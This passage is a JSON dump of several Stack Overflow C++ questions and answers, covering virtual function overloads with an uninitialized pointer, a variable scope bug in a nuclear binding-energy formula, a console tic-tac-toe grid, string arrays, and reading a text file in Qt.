"<p>Guys plz check the code below:</p>\n\n<pre><code>class Human\n{ \npublic:\n    void chat(Human h)\n    {\n        cout &lt;&lt; \"human\";\n    }\n\n    void chat(ComputerScientist c)\n    {\n        cout &lt;&lt; \"computer\";\n    }\n};\n\nclass ComputerScientist : public Human\n{\n};\n\n//Main function below\nint main()\n{\n    Human* p, p1;\n    //Uninitialized pointer above;\n\n    p-&gt;chat(p1); //It shows perfectly the result without ANY error!\n}\n</code></pre>\n\n<p>However, things go tricky if I make a function in derived class ComputerScientist which overrides the Human's one.</p>\n\n<pre><code>class Human\n{\npublic:\n    virtual void chat(Human* h)\n    {\n        cout &lt;&lt; \"about the weather\";\n    }\n\n    virtual void chat(ComputerScientist* c)\n    {\n        cout &lt;&lt; \"about their own computer illiteracy\";\n    }\n};\n\nclass ComputerScientist : public Human\n{\npublic:\n    virtual void chat(Human* h)\n    {\n        cout &lt;&lt; \" about computer games\";\n    }\n\n    virtual void chat(ComputerScientist* c)\n    {\n        cout &lt;&lt; \" about others\u2019 computer     illiteracy\";\n    }\n};\n</code></pre>\n\n<p>And I use the same main function, it appears to be a segmentation fault in the null pointer line. But why?</p>\n\n<p>Things have make change in two places in the second example:</p>\n\n<ol>\n<li>I used the overriding function by making it virtual.</li>\n<li>The function is taking a pointer as argument.</li>\n</ol>\n"}, {"tags": ["c++", "physics"], "comments": [{"owner": {"reputation": 519, "user_id": 837816, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/74285139dbc24c216077d8c833cfd59c?s=128&d=identicon&r=PG", "display_name": "jgsogo", "link": "https://stackoverflow.com/users/837816/jgsogo"}, "edited": false, "score": 1, "creation_date": 1429733078, "post_id": 29807643, "comment_id": 47743520, "body": "You can just declare the variable outside the <code>if</code> clause: <code>double a5 = 0;</code>."}], "answers": [{"tags": [], "owner": {"reputation": 149509, "user_id": 4342498, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/l3j88.jpg?s=128&g=1", "display_name": "NathanOliver", "link": "https://stackoverflow.com/users/4342498/nathanoliver"}, "is_accepted": false, "score": 3, "last_activity_date": 1429732987, "creation_date": 1429732987, "answer_id": 29807693, "question_id": 29807643, "link": "https://stackoverflow.com/questions/29807643/s-e-m-f-physics-c-code/29807693#29807693", "title": "S.E.M.F. physics C++ code", "body": "<p>You need to declare <code>a5</code> outside your if statements and then set it in the if statements</p>\n\n<pre><code>double a5 = 0;\n\nif(Z % 2 == 0 &amp;&amp; (A - Z) % 2 == 0)\n    a5 = 12.0;\nelse if(Z % 2 != 0 &amp;&amp; (A - Z) % 2 != 0)\n    a5 = -12.0;\n</code></pre>\n\n<p>As you have it right now the variable <code>a5</code> will only exist inside the if statement it is declared in.</p>\n"}, {"tags": [], "owner": {"reputation": 1854, "user_id": 224935, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/59h0o.jpg?s=128&g=1", "display_name": "Jay Elston", "link": "https://stackoverflow.com/users/224935/jay-elston"}, "is_accepted": false, "score": 6, "last_activity_date": 1429733000, "creation_date": 1429733000, "answer_id": 29807697, "question_id": 29807643, "link": "https://stackoverflow.com/questions/29807643/s-e-m-f-physics-c-code/29807697#29807697", "title": "S.E.M.F. physics C++ code", "body": "<p>a5 is undefined due to a scope issue.</p>\n\n<p>Because you declare a5 within the clauses of an if -- else statement, the declaration only has scope within the statement that it is declared.</p>\n\n<p>To fix this problem, declare a5 in a spot where its scope extends to the later statements where you are using a5:</p>\n\n<pre><code>double a1 = 15.67;          \ndouble a2 = 17.23;\ndouble a3 = 0.75;\ndouble a4 = 93.2;\ndouble a5 = 0.0;\n//^ declare a5 here, it will be in scope when used in subsequent statements past the else clause\n\n\nif(Z % 2 == 0 &amp;&amp; (A - Z) % 2 == 0)\n\n    a5 = 12.0;\n\nelse if(Z % 2 != 0 &amp;&amp; (A - Z) % 2 != 0)\n\n    a5 = -12.0;\n\n\n// Formula for to compute the binding energy\ndouble B =a1 * A - a2 * pow( A, 2/3) - a3 * (pow(Z, 2) / pow(A, 1/3)) - a4 * (pow(A - 2 * Z, 2) / A) + (a5 / pow(A, 1/2));\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 11458, "user_id": 3435400, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/61726fe80facc93d76754f0226b49eb9?s=128&d=identicon&r=PG&f=1", "display_name": "alain", "link": "https://stackoverflow.com/users/3435400/alain"}, "is_accepted": false, "score": 2, "last_activity_date": 1429733041, "creation_date": 1429733041, "answer_id": 29807706, "question_id": 29807643, "link": "https://stackoverflow.com/questions/29807643/s-e-m-f-physics-c-code/29807706#29807706", "title": "S.E.M.F. physics C++ code", "body": "<p>Just move the declaration of <code>a5</code> up a bit:</p>\n\n<pre><code>double a5;\nif(Z % 2 == 0 &amp;&amp; (A - Z) % 2 == 0)\n    a5 = 12.0;\nelse if(Z % 2 != 0 &amp;&amp; (A - Z) % 2 != 0)\n    a5 = -12.0;\nelse\n    a5 = 0;\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 654, "user_id": 4743711, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/l0qvK.png?s=128&g=1", "display_name": "Loreto", "link": "https://stackoverflow.com/users/4743711/loreto"}, "edited": false, "score": 1, "creation_date": 1429733443, "post_id": 29807767, "comment_id": 47743777, "body": "By the way; in &#39;Formula&#39; 2/3 == 0; as 1/3 and 1/2, because of integer division; you should write 2.0/3.0, 1.0/2.0 and 1.0/2.0 instead."}], "tags": [], "owner": {"reputation": 654, "user_id": 4743711, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/l0qvK.png?s=128&g=1", "display_name": "Loreto", "link": "https://stackoverflow.com/users/4743711/loreto"}, "is_accepted": true, "score": 2, "last_activity_date": 1429733253, "creation_date": 1429733253, "answer_id": 29807767, "question_id": 29807643, "link": "https://stackoverflow.com/questions/29807643/s-e-m-f-physics-c-code/29807767#29807767", "title": "S.E.M.F. physics C++ code", "body": "<p>Put the definition of </p>\n\n<pre><code>double a5 = 0.0;\n</code></pre>\n\n<p>just below the a4 definition, and use it in each of your ifs cases.</p>\n"}], "owner": {"reputation": 63, "user_id": 4812427, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ce4fecf7f84df0bb42520551277b5137?s=128&d=identicon&r=PG&f=1", "display_name": "Ryan M.", "link": "https://stackoverflow.com/users/4812427/ryan-m"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 572, "favorite_count": 0, "accepted_answer_id": 29807767, "answer_count": 4, "score": 3, "last_activity_date": 1582792880, "creation_date": 1429732821, "last_edit_date": 1429734352, "question_id": 29807643, "link": "https://stackoverflow.com/questions/29807643/s-e-m-f-physics-c-code", "title": "S.E.M.F. physics C++ code", "body": "<p>Need some help to solve one minor issue with this program. I have created the S.E.M.F. in physics for C++ to calculate the formula everything is great but my B.E. formula with a5 in it.</p>\n\n<p>It says Error: Identifier \"a5\" is undefined and I know what it means but how would I get that a5 to take from the Selection Statement, if I input even even or even odd or odd odd for my A Z values.</p>\n\n<pre><code>#include &lt;iostream&gt;\n#include &lt;cstdlib&gt;\n#include &lt;math.h&gt;\n\nusing namespace std;\n\nint main()\n{\n    int A, Z;\n\n    // Main body of Semi-Empirical Mass Formula\n    cout &lt;&lt;\"Enter the mass number A: \";\n    cin &gt;&gt; A;\n    cout &lt;&lt;\"\\n\";\n    cout &lt;&lt;\"Enter the atomic number Z: \";\n    cin &gt;&gt; Z;\n    cout &lt;&lt;\"\\n\";\n\n    // Constants from formula, units in MeV(millions of electron volts)\n    double a1 = 15.67;          \n    double a2 = 17.23;\n    double a3 = 0.75;\n    double a4 = 93.2;\n\n    if(Z % 2 == 0 &amp;&amp; (A - Z) % 2 == 0)\n\n        double a5 = 12.0;\n\n    else if(Z % 2 != 0 &amp;&amp; (A - Z) % 2 != 0)\n\n        double a5 = -12.0;\n\n    else\n\n        double a5 = 0;\n\n\n    // Formula for to compute the binding energy\n    double B =a1 * A - a2 * pow( A, 2/3) - a3 * (pow(Z, 2) / pow(A, 1/3)) - a4 * (pow(A - 2 * Z, 2) / A) + (a5 / pow(A, 1/2));\n\n    // Formula for to compute the binding energy per nucleon\n    double B_E = B / A;\n\n\n    return 0;\n\n}\n</code></pre>\n"}, {"tags": ["c++"], "comments": [{"owner": {"reputation": 149509, "user_id": 4342498, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/l3j88.jpg?s=128&g=1", "display_name": "NathanOliver", "link": "https://stackoverflow.com/users/4342498/nathanoliver"}, "edited": false, "score": 0, "creation_date": 1429732743, "post_id": 29807543, "comment_id": 47743308, "body": "looks like: <code>char testchar = 0;</code> and <code>setxychar(x,y,&amp;testchar,1);</code> and <code>testchar++;</code>"}, {"owner": {"reputation": 13, "user_id": 4817964, "user_type": "registered", "profile_image": "https://graph.facebook.com/10203842141914693/picture?type=large", "display_name": "Brittany Toering", "link": "https://stackoverflow.com/users/4817964/brittany-toering"}, "reply_to_user": {"reputation": 149509, "user_id": 4342498, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/l3j88.jpg?s=128&g=1", "display_name": "NathanOliver", "link": "https://stackoverflow.com/users/4342498/nathanoliver"}, "edited": false, "score": 0, "creation_date": 1429805968, "post_id": 29807543, "comment_id": 47784557, "body": "Thanks for your help- I will mark that as an answer if you post it as one."}], "answers": [{"tags": [], "owner": {"reputation": 149509, "user_id": 4342498, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/l3j88.jpg?s=128&g=1", "display_name": "NathanOliver", "link": "https://stackoverflow.com/users/4342498/nathanoliver"}, "is_accepted": true, "score": 0, "last_activity_date": 1429808558, "creation_date": 1429808558, "answer_id": 29830007, "question_id": 29807543, "link": "https://stackoverflow.com/questions/29807543/change-output-inside-grid/29830007#29830007", "title": "Change output inside grid", "body": "<p>It looks like the relevant parts are: </p>\n\n<pre><code>char testchar = 0; \n</code></pre>\n\n<p>and </p>\n\n<pre><code>setxychar(x,y,&amp;testchar,1); \n</code></pre>\n\n<p>and </p>\n\n<pre><code>testchar++;\n</code></pre>\n"}], "owner": {"reputation": 13, "user_id": 4817964, "user_type": "registered", "profile_image": "https://graph.facebook.com/10203842141914693/picture?type=large", "display_name": "Brittany Toering", "link": "https://stackoverflow.com/users/4817964/brittany-toering"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 58, "favorite_count": 0, "accepted_answer_id": 29830007, "answer_count": 1, "score": 0, "last_activity_date": 1429808558, "creation_date": 1429732488, "question_id": 29807543, "link": "https://stackoverflow.com/questions/29807543/change-output-inside-grid", "title": "Change output inside grid", "body": "<p>I am trying to use the following console display class to display a tic tac toe game- this is for an assignment- I was given the following code to use- \nThe console displays a grid with columns marked 0-9, and shows rows marked 0-9- The console also displays random characters inside the grid- I need to change the random characters to ones that I choose- but I cannot find the part in the code that sets the space in the middle grid. </p>\n\n<p>If anyone could help me pin point the part in the code that decides what is displayed in the grid, I would be very appreciative.</p>\n\n<p>Note- It is necessary to change character set to (use Multi-Byte Character set) in order to see proper output from program. changer character set is under Project Properties- General - Project Defaults in Visual Studio</p>\n\n<pre><code> #include \"stdafx.h\"\n    #include &lt;windows.h&gt;\n    #include &lt;iostream&gt;\n    #include &lt;tchar.h&gt;\n\n\n    using std::cin;\n\n    bool setxychar( int x, int y, const char* pBuf, int len )\n    {\n        HANDLE console_handle;\n        COORD cursor_coord;\n        DWORD actual=0;\n\n        console_handle= GetStdHandle(STD_OUTPUT_HANDLE);\n        cursor_coord.X=x;       // (40-(strlen(buffer)/2)); \n        cursor_coord.Y=y;\n\n        //This would be the equivalent to gotoxy(x,y).\n        if (SetConsoleCursorPosition(console_handle,cursor_coord)) \n        {\n            // Look up this function in your VC++ help/index\n            WriteConsole(console_handle,pBuf,len,&amp;actual,NULL);\n            return true;\n        }\n        return false;\n    }\n\n    // setxychar()  - Overloaded\n    // this method allows you to print a single character at a location\n    bool setxychar( int x, int y, char Buf )\n    {\n\n        return( setxychar( x, y, &amp;Buf, 1 ) );\n    }\n\n    int _tmain(int argc, _TCHAR* argv[])\n    {\n        const char graybar = '\\xB2';\n        char *buffer =\"Tic Tac Toe\";\n        int x=0, y=0;\n        for(x=0; x&lt;80; x++) // vertical borders\n        {\n            y=0;\n            setxychar(x,y,&amp;graybar,1);\n            y=23;\n            setxychar(x,y,&amp;graybar,1);\n        }\n        for( y=0; y&lt;24; y++ )   // horizontal borders\n        {\n            x=0;\n            setxychar(x,y,&amp;graybar,1);\n            x=79;\n            setxychar(x,y,&amp;graybar,1);\n        }\n        setxychar(3,3,' ');  // position pointer\n        printf( \"  0 1 2 3 4 5 6 7 8 9 A  B C D E F\\n\" );\n        char testchar = 0;      // A warning is put up by the compiler \n        for(y=4; y&lt;20; y++ )    // \"warning C4309: 'initializing' : truncation of constant value\"\n        {                       // 80 hex is the same as -128,  Hex is just easier\n            setxychar(1,y,' ');  // position pointer\n            printf( \"%X\", 16*(y-4) );\n            for(x=6; x&lt;38; x+=2)\n            {\n                setxychar(x,y,&amp;testchar,1);\n                testchar++;\n            }\n        }\n\n        // Putting text to screen just for fun\n        setxychar(52,6,buffer,(int)strlen(buffer));\n\n        setxychar(1,22,' ');  // position pointer\n        cin.get();\n        return 0;\n    }\n</code></pre>\n"}, {"tags": ["c++", "arrays"], "comments": [{"owner": {"reputation": 149509, "user_id": 4342498, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/l3j88.jpg?s=128&g=1", "display_name": "NathanOliver", "link": "https://stackoverflow.com/users/4342498/nathanoliver"}, "edited": false, "score": 0, "creation_date": 1429732468, "post_id": 29807477, "comment_id": 47743120, "body": "What are you actually trying to accomplish?  There is probably a better way to do it than this."}, {"owner": {"user_type": "does_not_exist", "display_name": "user2249683"}, "edited": false, "score": 1, "creation_date": 1429732468, "post_id": 29807477, "comment_id": 47743121, "body": "Please avoid pointers"}, {"owner": {"reputation": 3410, "user_id": 1386873, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/f5c6b807358fea9ae43f61e9006f6908?s=128&d=identicon&r=PG", "display_name": "puelo", "link": "https://stackoverflow.com/users/1386873/puelo"}, "edited": false, "score": 2, "creation_date": 1429732491, "post_id": 29807477, "comment_id": 47743136, "body": "You are not comparing i and 0 your are assigning it. Use <code>i == 0</code> instead"}, {"owner": {"reputation": 8617, "user_id": 3477950, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/mC5xL.jpg?s=128&g=1", "display_name": "The Paramagnetic Croissant", "link": "https://stackoverflow.com/users/3477950/the-paramagnetic-croissant"}, "edited": false, "score": 0, "creation_date": 1429732654, "post_id": 29807477, "comment_id": 47743249, "body": "typo questions are off-topic. also use <code>std::vector</code>."}, {"owner": {"reputation": 4010, "user_id": 1812187, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/MRXi9.png?s=128&g=1", "display_name": "Carlton", "link": "https://stackoverflow.com/users/1812187/carlton"}, "edited": false, "score": 0, "creation_date": 1429732719, "post_id": 29807477, "comment_id": 47743291, "body": "It would be much safer to use <code>std::vector&lt;std::string&gt;</code> instead of an array of strings.  Or, better yet: <code>using StringVector = std::vector&lt;std::string&gt;;</code>"}, {"owner": {"user_type": "does_not_exist", "display_name": "user2249683"}, "edited": false, "score": 0, "creation_date": 1429732720, "post_id": 29807477, "comment_id": 47743293, "body": "That code should not compile."}, {"owner": {"reputation": 54818, "user_id": 962089, "user_type": "registered", "accept_rate": 97, "profile_image": "https://i.stack.imgur.com/b6SVs.jpg?s=128&g=1", "display_name": "chris", "link": "https://stackoverflow.com/users/962089/chris"}, "edited": false, "score": 0, "creation_date": 1429732793, "post_id": 29807477, "comment_id": 47743346, "body": "Well now I <a href=\"http://coliru.stacked-crooked.com/a/708cab7d15646ade\" rel=\"nofollow noreferrer\">can&#39;t reproduce</a> your problem."}, {"owner": {"reputation": 10555, "user_id": 2812864, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/GVsZM.jpg?s=128&g=1", "display_name": "Mateusz Grzejek", "link": "https://stackoverflow.com/users/2812864/mateusz-grzejek"}, "edited": false, "score": 0, "creation_date": 1429733056, "post_id": 29807477, "comment_id": 47743511, "body": "Because original question had bug, which is now removed.  @Ojmeny If you ask a question and provide buggy code, do not remove these bugs. Now your question is meaningless, since your code after edit is the answer (although it is still very error-prone)."}, {"owner": {"reputation": 32303, "user_id": 4386427, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d2d2716ce8bcf5967e7b3c00bd0095b5?s=128&d=identicon&r=PG&f=1", "display_name": "4386427", "link": "https://stackoverflow.com/users/4386427/4386427"}, "edited": false, "score": 0, "creation_date": 1429734032, "post_id": 29807477, "comment_id": 47744090, "body": "@Ojmeny  - I think the real problem is the &quot;expected result&quot;, i.e. how is the returned acc used. Explain what you want to achieve. Show the code calling the function and what you do afterwards."}], "answers": [{"comments": [{"owner": {"reputation": 1018, "user_id": 4175690, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/3ad8359be15c37c5217632368ffaf386?s=128&d=identicon&r=PG&f=1", "display_name": "Ojmeny", "link": "https://stackoverflow.com/users/4175690/ojmeny"}, "edited": false, "score": 0, "creation_date": 1429732639, "post_id": 29807564, "comment_id": 47743235, "body": "Sorry, for not checking my code :( It should be <code>i == 0</code>"}, {"owner": {"reputation": 435402, "user_id": 179910, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d8962238339d771f0348967be6f97b1b?s=128&d=identicon&r=PG", "display_name": "Jerry Coffin", "link": "https://stackoverflow.com/users/179910/jerry-coffin"}, "edited": false, "score": 0, "creation_date": 1429733220, "post_id": 29807564, "comment_id": 47743622, "body": "...or just <code>std::vector&lt;std::string&gt; vs {&quot;ab&quot;, &quot;cd&quot;};</code>"}, {"owner": {"reputation": 4009, "user_id": 1922748, "user_type": "registered", "accept_rate": 82, "profile_image": "https://i.stack.imgur.com/09w3M.jpg?s=128&g=1", "display_name": "Martin Schlott", "link": "https://stackoverflow.com/users/1922748/martin-schlott"}, "reply_to_user": {"reputation": 435402, "user_id": 179910, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d8962238339d771f0348967be6f97b1b?s=128&d=identicon&r=PG", "display_name": "Jerry Coffin", "link": "https://stackoverflow.com/users/179910/jerry-coffin"}, "edited": false, "score": 0, "creation_date": 1429772285, "post_id": 29807564, "comment_id": 47759023, "body": "@JerryCoffin on initilizing, yes. I wanted to show a solution near to his existing code. I update my answer to be more clear."}], "tags": [], "owner": {"reputation": 4009, "user_id": 1922748, "user_type": "registered", "accept_rate": 82, "profile_image": "https://i.stack.imgur.com/09w3M.jpg?s=128&g=1", "display_name": "Martin Schlott", "link": "https://stackoverflow.com/users/1922748/martin-schlott"}, "is_accepted": false, "score": 1, "last_activity_date": 1430914388, "last_edit_date": 1430914388, "creation_date": 1429732580, "answer_id": 29807564, "question_id": 29807477, "link": "https://stackoverflow.com/questions/29807477/adding-to-string-array-and-reference/29807564#29807564", "title": "Adding to String array and reference", "body": "<p>No, you simply made a bug:</p>\n\n<pre><code>for ( int i = 0; i &lt; 2; i ++ ) {\n\n     if ( i == 0 ) // == instead of = !!!!!!!!!!!!!!!!!!!!!!\n        some_string = \"ab\";\n     else \n        some_string = \"cd\";\n     acc[i] = some_string;\n     some_string = \"\";\n}\nreturn acc;\n</code></pre>\n\n<p>Think over using a std::vector or std::list instead of pointer too. With a vector, your code looks like:</p>\n\n<pre><code>std::vector&lt;std::string&gt; vs;\n</code></pre>\n\n<p>...and later...    </p>\n\n<pre><code>vs.push_back(\"ab\");\nvs.push_back(\"cd\");\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 10555, "user_id": 2812864, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/GVsZM.jpg?s=128&g=1", "display_name": "Mateusz Grzejek", "link": "https://stackoverflow.com/users/2812864/mateusz-grzejek"}, "is_accepted": false, "score": 1, "last_activity_date": 1429732838, "creation_date": 1429732838, "answer_id": 29807647, "question_id": 29807477, "link": "https://stackoverflow.com/questions/29807477/adding-to-string-array-and-reference/29807647#29807647", "title": "Adding to String array and reference", "body": "<p>I really don't think you should write code this way. And you don't need temporary <code>some_string</code> - assigning strings is well-defined and do exactly what it should. In thi case, use <code>vector</code> - it is <strong>much</strong> safer approach:</p>\n\n<pre><code>#include &lt;iostream&gt;\n#include &lt;string&gt;\n#include &lt;vector&gt;\n\nusing namespace std;\n\nint main()\n{\n    vector&lt;string&gt; ac;\n\n    for(int i = 0; i &lt; 2; ++i)\n    {\n        if(i == 0)\n            ac.push_back(\"ab\");\n        else\n            ac.push_back(\"cd\");\n    }\n\n    cout&lt;&lt;ac[0]&lt;&lt;ac[1]&lt;&lt;endl;\n\n    return 0;\n}\n</code></pre>\n\n<p>Working sample: <a href=\"http://ideone.com/2X6Jkv\" rel=\"nofollow\">here</a>.</p>\n"}, {"tags": [], "owner": {"reputation": 32303, "user_id": 4386427, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d2d2716ce8bcf5967e7b3c00bd0095b5?s=128&d=identicon&r=PG&f=1", "display_name": "4386427", "link": "https://stackoverflow.com/users/4386427/4386427"}, "is_accepted": false, "score": 1, "last_activity_date": 1429734485, "last_edit_date": 1429734485, "creation_date": 1429733360, "answer_id": 29807794, "question_id": 29807477, "link": "https://stackoverflow.com/questions/29807477/adding-to-string-array-and-reference/29807794#29807794", "title": "Adding to String array and reference", "body": "<p>It is not clear why you expect \"abcd\" as result.\nYou assign some_string the value \"cd\" instead of adding to \"ab\".</p>\n\n<p>Maybe this is what you are trying:</p>\n\n<pre><code>string* func()\n{\n    string *acc = new string[2];\n    string some_string;\n\n    for ( int i = 0; i &lt; 2; i ++ ) \n    {\n\n        if ( i == 0 )\n            some_string = \"ab\";                 // \"ab\"\n         else\n            some_string = some_string + \"cd\";   // \"ab\" + \"cd\" -&gt; \"abcd\"\n\n         acc[i] = some_string;\n         //some_string = \"\";\n    }\n    return acc;\n}\n\nint main(int argc, char** argv)\n{\n    string* y = func();\n\n    cout &lt;&lt; y[0] &lt;&lt;  endl;  // First element \"ab\"\n    cout &lt;&lt; y[1] &lt;&lt;  endl;  // Second element \"abcd\"\n\n    // Other stuff\n    // ....\n\n    // Remember to delete y\n\n    return(0);\n}\n</code></pre>\n\n<p>Output:</p>\n\n<pre><code>ab\nabcd\n</code></pre>\n\n<p>But as others had said.... Use vector instead.</p>\n\n<p>You could also use std::array like this:</p>\n\n<pre><code>array&lt;string, 2&gt; func2()\n{\n    array&lt;string, 2&gt; res;\n    string some_string;\n\n    for ( int i = 0; i &lt; 2; i ++ )\n    {\n\n        if ( i == 0 )\n            some_string = \"ab\";\n         else\n            some_string = some_string + \"cd\";\n\n         res[i] = some_string;\n    }\n\n    // Or just this instead of a for loop\n    // res[0] = \"ab\";\n    // res[1] = \"abcd\";\n\n    return res;\n}\n\n\nint main(int argc, char** argv)\n{\n    array&lt;string, 2&gt; z = func2();\n\n    cout &lt;&lt; z[0] &lt;&lt;  endl;\n    cout &lt;&lt; z[1] &lt;&lt;  endl;\n\n    return(0);\n}\n</code></pre>\n"}], "owner": {"reputation": 1018, "user_id": 4175690, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/3ad8359be15c37c5217632368ffaf386?s=128&d=identicon&r=PG&f=1", "display_name": "Ojmeny", "link": "https://stackoverflow.com/users/4175690/ojmeny"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 59, "favorite_count": 0, "answer_count": 3, "score": -1, "last_activity_date": 1430914388, "creation_date": 1429732244, "last_edit_date": 1429732586, "question_id": 29807477, "link": "https://stackoverflow.com/questions/29807477/adding-to-string-array-and-reference", "title": "Adding to String array and reference", "body": "<p>I have dynamic string's array:</p>\n\n<pre><code>string *acc = new string[2];\nstring some_string;\n</code></pre>\n\n<p>I would like to add two strings to this array, but there is problem with reference ( i think).</p>\n\n<p>I have following example (very ugly, but it shows the problem):</p>\n\n<pre><code>for ( int i = 0; i &lt; 2; i ++ ) {\n\n     if ( i == 0 )\n        some_string = \"ab\";\n     else \n        some_string = \"cd\";\n     acc[i] = some_string;\n     some_string = \"\";\n}\nreturn acc\n</code></pre>\n\n<p>Of course this code is without any sense, but my code is more complicated and it would hide the problem.\nThe point is that code is returning <code>cd</code> instead of <code>abcd</code>. In my opinion <code>some_string = \"\";</code> make mess here. Am I right? \nIs it possible to do it keeping logic of code?</p>\n"}, {"tags": ["c++", "qt", "text"], "comments": [{"owner": {"reputation": 10703, "user_id": 3134621, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c46cfe9f917da02becc991d76352d77c?s=128&d=identicon&r=PG&f=1", "display_name": "deviantfan", "link": "https://stackoverflow.com/users/3134621/deviantfan"}, "edited": false, "score": 3, "creation_date": 1429732229, "post_id": 29807384, "comment_id": 47742979, "body": "Sfile needs to survive multiple <code>on_Next_clicked</code>.=&gt; Put it into MainWindow scope etc."}, {"owner": {"reputation": 245138, "user_id": 2069064, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/e4V2X.jpg?s=128&g=1", "display_name": "Barry", "link": "https://stackoverflow.com/users/2069064/barry"}, "edited": false, "score": 0, "creation_date": 1429922778, "post_id": 29807384, "comment_id": 47845301, "body": "make the wording a little clearer, minor grammar issues."}], "answers": [{"tags": [], "owner": {"reputation": 6085, "user_id": 425871, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/58MZp.jpg?s=128&g=1", "display_name": "Steve", "link": "https://stackoverflow.com/users/425871/steve"}, "is_accepted": true, "score": 0, "last_activity_date": 1429734051, "creation_date": 1429734051, "answer_id": 29807996, "question_id": 29807384, "link": "https://stackoverflow.com/questions/29807384/showing-txt-file-details/29807996#29807996", "title": "Showing txt file details", "body": "<p>Every time this method is executed:</p>\n\n<pre><code>void MainWindow::on_Next_clicked()\n{\n    ui-&gt;ShowEn-&gt;clear();\n    ifstream Sfile(\"E:\\\\en.txt\");\n    getData(Sfile);\n   Sfile.close();\n}\n</code></pre>\n\n<p>The file is opened anew and the first bit is read with getData. The file is then closed. Every time the file is opened, reading starts over from the beginning, which is why you see the same string every time.</p>\n\n<p>You probably want to open your file somewhere else (the window's constructor, perhaps?), then simply read it on each button click. This will require a member variable in <code>MainWindow</code> to hold the open file. Don't close it until you're done.</p>\n"}], "owner": {"reputation": 45, "user_id": 4113498, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-clvYx2RuO4E/AAAAAAAAAAI/AAAAAAAAABI/2Mg2NO2vSjw/photo.jpg?sz=128", "display_name": "Raminlich", "link": "https://stackoverflow.com/users/4113498/raminlich"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 79, "favorite_count": 0, "accepted_answer_id": 29807996, "answer_count": 1, "score": 1, "last_activity_date": 1429922778, "creation_date": 1429731926, "last_edit_date": 1429922778, "question_id": 29807384, "link": "https://stackoverflow.com/questions/29807384/showing-txt-file-details", "title": "Showing txt file details", "body": "<p>I have a <code>.txt</code> file with these contents:</p>\n\n<pre><code>good  \nbad  \nhi \n</code></pre>\n\n<p>I want the Next button to cycle through these words, but with my code I only get the word \"good\". When I click Next, it doesn't show the next word. Here is my code with <code>Qt 5.4</code>.</p>\n\n<pre><code>void MainWindow::on_Next_clicked()\n{\n    ui-&gt;ShowEn-&gt;clear();\n    ifstream Sfile(\"E:\\\\en.txt\");\n    getData(Sfile);\n    Sfile.close();\n}\n\nvoid MainWindow::getData(std::ifstream&amp; myfile)\n{\n\n    if(!myfile.eof())\n    {\n        std::string str;\n        getline(myfile, str);\n        ui-&gt;ShowEn-&gt;setText(QString::fromStdString(str));\n    }\n}\n</code></pre>\n"}, {"tags": ["c++", "median"], "answers": [{"comments": [{"owner": {"reputation": 411, "user_id": 1691075, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Kg1kX.jpg?s=128&g=1", "display_name": "Nada Ghanem", "link": "https://stackoverflow.com/users/1691075/nada-ghanem"}, "edited": false, "score": 0, "creation_date": 1429783140, "post_id": 29816542, "comment_id": 47766448, "body": "Thank you Steven !. A neat solution . Though the problem is not hard ,I couldn&#39;t get a right answer :(..!  . Do you have any suggestions ideas on how I can improve my performance in online judge? ..my-no:616507"}, {"owner": {"reputation": 86, "user_id": 4809967, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3052af46b5500bebdb0ecdd672433fac?s=128&d=identicon&r=PG&f=1", "display_name": "yulonglong", "link": "https://stackoverflow.com/users/4809967/yulonglong"}, "reply_to_user": {"reputation": 411, "user_id": 1691075, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Kg1kX.jpg?s=128&g=1", "display_name": "Nada Ghanem", "link": "https://stackoverflow.com/users/1691075/nada-ghanem"}, "edited": false, "score": 0, "creation_date": 1429785181, "post_id": 29816542, "comment_id": 47767854, "body": "I would suggest you to keep practicing the problems there. Systematically try each chapter of the <code>Competitive Programming 3 book</code> from Introduction and Standard Data Structures and Libraries, Graph, etc. Do you use uhunt? it helps a lot. <code>http:&#47;&#47;uhunt.felix-halim.net&#47;</code>"}, {"owner": {"reputation": 86, "user_id": 4809967, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3052af46b5500bebdb0ecdd672433fac?s=128&d=identicon&r=PG&f=1", "display_name": "yulonglong", "link": 